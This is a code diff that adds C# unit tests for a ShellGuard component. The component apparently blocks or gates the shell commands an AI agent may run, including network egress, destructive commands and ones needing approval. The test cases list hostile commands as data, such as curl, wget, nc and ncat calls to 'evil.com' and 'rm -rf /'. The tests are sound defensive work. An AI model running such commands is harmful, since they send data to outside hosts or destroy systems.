@@ -1,5 +1,6 @@
 using System.Diagnostics;
 using Clawsharp.Security;
+using Microsoft.Extensions.Logging.Abstractions;
 
 namespace Clawsharp.Tests.Security;
 
@@ -672,5 +673,245 @@ public sealed class ShellGuardTests
 
         result.ShouldNotBeNull($"Expected uppercase '{command}' to be blocked");
         result.ShouldContain("blocked");
+    }
+
+    // ── CheckCommandWithEgress: egress patterns ────────────────────────
+
+    [TestCase("curl https://example.com/data", "curl")]
+    [TestCase("curl -s https://evil.com/exfil", "curl")]
+    [TestCase("wget https://example.com/file.zip", "wget")]
+    [TestCase("wget -O /tmp/data https://evil.com", "wget")]
+    [TestCase("nc evil.com 4444", "netcat")]
+    [TestCase("netcat evil.com 4444", "netcat")]
+    [TestCase("ncat --ssl evil.com 443", "netcat")]
+    [TestCase("telnet evil.com 25", "telnet")]
+    [TestCase("nslookup evil.com", "DNS tool")]
+    [TestCase("dig @8.8.8.8 evil.com TXT", "DNS tool")]
+    [TestCase("host evil.com", "DNS tool")]
+    [TestCase("scp file.txt user@host:/tmp/", "scp")]
+    [TestCase("rsync user@host:/backup/ ./data", "rsync")]
+    public void CheckCommandWithEgress_EgressPattern_Blocked(string command, string expectedCategory)
+    {
+        var result = ShellGuard.CheckCommandWithEgress(command);
+
+        result.ShouldNotBeNull($"Expected '{command}' to be blocked by egress guard");
+        result.ShouldContain("non-CLI channel");
+        result.ShouldContain(expectedCategory);
+    }
+
+    [TestCase("rm -rf /", "destructive rm")]
+    [TestCase("shutdown -h now", "system control")]
+    [TestCase("sudo apt update", "privilege escalation")]
+    public void CheckCommandWithEgress_StandardDenyPatterns_StillEnforced(string command, string _)
+    {
+        var result = ShellGuard.CheckCommandWithEgress(command);
+
+        result.ShouldNotBeNull($"Expected standard deny pattern to block '{command}'");
+        result.ShouldContain("blocked");
+    }
+
+    [TestCase("ls -la")]
+    [TestCase("cat file.txt")]
+    [TestCase("echo hello")]
+    [TestCase("git status")]
+    [TestCase("dotnet build")]
+    [TestCase("grep -r pattern .")]
+    public void CheckCommandWithEgress_SafeCommands_Allowed(string command)
+    {
+        var result = ShellGuard.CheckCommandWithEgress(command);
+
+        result.ShouldBeNull($"Expected '{command}' to be allowed but got: {result}");
+    }
+
+    [Test]
+    public void CheckCommandWithEgress_CustomDenyPatternsWork()
+    {
+        var custom = new List<string> { @"\bsensitive_tool\b" };
+
+        var result = ShellGuard.CheckCommandWithEgress("sensitive_tool --flag", custom);
+
+        result.ShouldNotBeNull();
+        result.ShouldContain("custom deny pattern");
+    }
+
+    [Test]
+    public void CheckCommandWithEgress_RsyncLocal_Allowed()
+    {
+        // rsync without remote host:path syntax should not trigger egress
+        var result = ShellGuard.CheckCommandWithEgress("rsync -av /src/ /dst/");
+
+        result.ShouldBeNull("Local rsync should be allowed");
+    }
+
+    // ── ConfigureCustomPatterns ─────────────────────────────────────────
+
+    [TearDown]
+    public void ResetCustomPatterns()
+    {
+        // Reset compiled custom patterns after each test so state doesn't bleed
+        ShellGuard.ConfigureCustomPatterns(null, null, null, NullLogger.Instance);
+    }
+
+    [Test]
+    public void ConfigureCustomPatterns_DenyPattern_BlocksCommand()
+    {
+        ShellGuard.ConfigureCustomPatterns(
+            denyPatterns: [@"\bforbidden_cmd\b"],
+            approvalPatterns: null,
+            autoApprovePatterns: null,
+            logger: NullLogger.Instance);
+
+        var result = ShellGuard.CheckCommand("forbidden_cmd --flag");
+
+        result.ShouldNotBeNull();
+        result.ShouldContain("custom deny pattern");
+    }
+
+    [Test]
+    public void ConfigureCustomPatterns_DenyPattern_AllowsNonMatching()
+    {
+        ShellGuard.ConfigureCustomPatterns(
+            denyPatterns: [@"\bforbidden_cmd\b"],
+            approvalPatterns: null,
+            autoApprovePatterns: null,
+            logger: NullLogger.Instance);
+
+        var result = ShellGuard.CheckCommand("ls -la");
+
+        result.ShouldBeNull();
+    }
+
+    [Test]
+    public void ConfigureCustomPatterns_ApprovalPattern_TriggersApproval()
+    {
+        ShellGuard.ConfigureCustomPatterns(
+            denyPatterns: null,
+            approvalPatterns: [@"\bdeploy\b"],
+            autoApprovePatterns: null,
+            logger: NullLogger.Instance);
+
+        var result = ShellGuard.RequiresApproval("deploy production", null, null);
+
+        result.ShouldNotBeNull();
+    }
+
+    [Test]
+    public void ConfigureCustomPatterns_AutoApprove_OverridesApproval()
+    {
+        ShellGuard.ConfigureCustomPatterns(
+            denyPatterns: null,
+            approvalPatterns: [@"\bdeploy\b"],
+            autoApprovePatterns: [@"\bdeploy\s+staging\b"],
+            logger: NullLogger.Instance);
+
+        var result = ShellGuard.RequiresApproval("deploy staging", null, null);
+
+        result.ShouldBeNull("Auto-approve should override the approval requirement");
+    }
+
+    [Test]
+    public void ConfigureCustomPatterns_AutoApprove_DoesNotOverrideNonMatching()
+    {
+        ShellGuard.ConfigureCustomPatterns(
+            denyPatterns: null,
+            approvalPatterns: [@"\bdeploy\b"],
+            autoApprovePatterns: [@"\bdeploy\s+staging\b"],
+            logger: NullLogger.Instance);
+
+        var result = ShellGuard.RequiresApproval("deploy production", null, null);
+
+        result.ShouldNotBeNull("Auto-approve for staging should not override production deploy approval");
+    }
+
+    [Test]
+    public void ConfigureCustomPatterns_InvalidRegex_SkippedGracefully()
+    {
+        // Should not throw — invalid regex is silently skipped
+        Should.NotThrow(() =>
+            ShellGuard.ConfigureCustomPatterns(
+                denyPatterns: ["[invalid(regex"],
+                approvalPatterns: null,
+                autoApprovePatterns: null,
+                logger: NullLogger.Instance));
+
+        // Valid command should still be allowed since the only custom pattern was invalid
+        var result = ShellGuard.CheckCommand("ls -la");
+        result.ShouldBeNull();
+    }
+
+    [Test]
+    public void ConfigureCustomPatterns_MixOfValidAndInvalid_ValidStillWorks()
+    {
+        ShellGuard.ConfigureCustomPatterns(
+            denyPatterns: ["[bad(regex", @"\bblocked_cmd\b"],
+            approvalPatterns: null,
+            autoApprovePatterns: null,
+            logger: NullLogger.Instance);
+
+        var result = ShellGuard.CheckCommand("blocked_cmd --arg");
+        result.ShouldNotBeNull("Valid pattern should still work alongside invalid one");
+        result.ShouldContain("custom deny pattern");
+    }
+
+    // ── RequiresApproval ────────────────────────────────────────────────
+
+    [TestCase("git push origin main", @"\bgit\s+push\b")]
+    [TestCase("git push --force origin main", @"\bgit\s+push\b")]
+    [TestCase("rm file.txt", @"\brm\s+")]
+    [TestCase("rm -rf /tmp/data", @"\brm\s+")]
+    [TestCase("git reset --hard HEAD~1", @"\bgit\s+reset\b")]
+    [TestCase("docker build -t myapp .", @"\bdocker\s+")]
+    [TestCase("docker compose up", @"\bdocker\s+")]
+    public void RequiresApproval_BuiltInPatterns_RequiresApproval(string command, string expectedPattern)
+    {
+        var result = ShellGuard.RequiresApproval(command, null, null);
+
+        result.ShouldNotBeNull($"Expected '{command}' to require approval");
+        result.ShouldBe(expectedPattern);
+    }
+
+    [Test]
+    public void RequiresApproval_AutoApprove_OverridesBuiltIn()
+    {
+        var autoApprove = new List<string> { @"\bgit\s+push\s+origin\s+main\b" };
+
+        var result = ShellGuard.RequiresApproval("git push origin main", null, autoApprove);
+
+        result.ShouldBeNull("Auto-approve pattern should override built-in approval requirement");
+    }
+
+    [TestCase("ls -la")]
+    [TestCase("cat file.txt")]
+    [TestCase("echo hello")]
+    [TestCase("git status")]
+    [TestCase("dotnet build")]
+    [TestCase("grep -r pattern .")]
+    public void RequiresApproval_SafeCommands_NoApproval(string command)
+    {
+        var result = ShellGuard.RequiresApproval(command, null, null);
+
+        result.ShouldBeNull($"Expected '{command}' to not require approval but got: {result}");
+    }
+
+    [Test]
+    public void RequiresApproval_CustomApprovalPattern_Works()
+    {
+        var approvalPatterns = new List<string> { @"\bkubectl\s+apply\b" };
+
+        var result = ShellGuard.RequiresApproval("kubectl apply -f deployment.yaml", approvalPatterns, null);
+
+        result.ShouldNotBeNull();
+        result.ShouldBe(@"\bkubectl\s+apply\b");
+    }
+
+    [Test]
+    public void RequiresApproval_CustomAutoApproveOverridesCustomApproval()
+    {
+        var approval = new List<string> { @"\bkubectl\b" };
+        var autoApprove = new List<string> { @"\bkubectl\s+get\b" };
+
+        var result = ShellGuard.RequiresApproval("kubectl get pods", approval, autoApprove);
+
+        result.ShouldBeNull("kubectl get should be auto-approved");
     }
 }
